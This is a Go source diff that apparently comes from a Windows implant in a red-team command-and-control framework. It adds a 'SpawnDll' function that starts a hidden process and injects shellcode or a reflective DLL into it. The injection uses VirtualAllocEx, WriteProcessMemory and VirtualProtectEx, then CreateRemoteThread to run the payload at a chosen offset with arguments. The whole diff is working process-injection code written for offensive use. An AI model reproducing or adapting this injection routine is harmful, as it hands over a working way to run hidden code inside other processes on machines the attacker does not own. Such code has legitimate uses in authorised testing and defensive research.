@@ -1,4 +1,5 @@
 //+build windows
+
 package taskrunner
 
 /*
@@ -502,8 +503,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	return outStr, nil
 }
 
-// SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte) (string, error) {
+func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
 	var err error
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
@@ -524,16 +524,19 @@ func Sideload(procName string, data []byte) (string, error) {
 			return "", err
 		}
 	}
+	var stdoutBuff bytes.Buffer
+	var stderrBuff bytes.Buffer
 	// 1 - Start process
 	cmd := exec.Command(procName)
+	cmd.Stdout = &stdoutBuff
+	cmd.Stderr = &stderrBuff
 	cmd.SysProcAttr = &syscall.SysProcAttr{
+		//{{if .Debug}}
+		HideWindow: false,
+		//{{else}}
 		HideWindow: true,
+		//{{end}}
 	}
-	var stdoutBuf, stderrBuf bytes.Buffer
-	stdoutIn, _ := cmd.StdoutPipe()
-	stderrIn, _ := cmd.StderrPipe()
-
-	var errStdout, errStderr error
 	err = cmd.Start()
 	if err != nil {
 		//{{if .Debug}}
@@ -561,6 +564,23 @@ func Sideload(procName string, data []byte) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	argAddr := uintptr(0)
+	if len(args) > 0 {
+		// VirtualAllocEx to allocate a new memory segment into the target process
+		argAddr, err = virtualAllocEx(handle, 0, uint32(len(args)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+		if err != nil {
+			return "", err
+		}
+		// WriteProcessMemory to write the reflective loader into the process
+		_, err = writeProcessMemory(handle, argAddr, unsafe.Pointer(&[]byte(args)[0]), uint32(len(args)))
+		if err != nil {
+			return "", err
+		}
+
+	}
+	//{{if .Debug}}
+	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
+	//{{end}}
 	// Apply R-X perms
 	var oldProtect int
 	err = virtualProtectEx(handle, dataAddr, uint(len(data)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
@@ -571,9 +591,8 @@ func Sideload(procName string, data []byte) (string, error) {
 		return "", err
 	}
 	// 3 - Create thread
-	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(dataAddr), uintptr(0), 0)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(dataAddr)+uintptr(offset), uintptr(argAddr), 0)
 	if err != nil {
 		return "", err
 	}
@@ -598,21 +617,10 @@ func Sideload(procName string, data []byte) (string, error) {
 		}
 	}
 	cmd.Process.Kill()
-	go func() {
-		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
-	}()
-	_, errStderr = io.Copy(&stderrBuf, stderrIn)
+	return stdoutBuff.String() + stderrBuff.String(), nil
+}
 
-	if errStdout != nil {
-		return "", errStdout
-	}
-	if errStderr != nil {
-		return "", errStderr
-	}
-	outStr := string(stdoutBuf.Bytes())
-	// {{if .Debug}}
-	log.Println("[*] Output:")
-	log.Println(outStr)
-	// {{end}}
-	return outStr, nil
+//SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, data []byte) (string, error) {
+	return SpawnDll(procName, data, 0, "")
 }
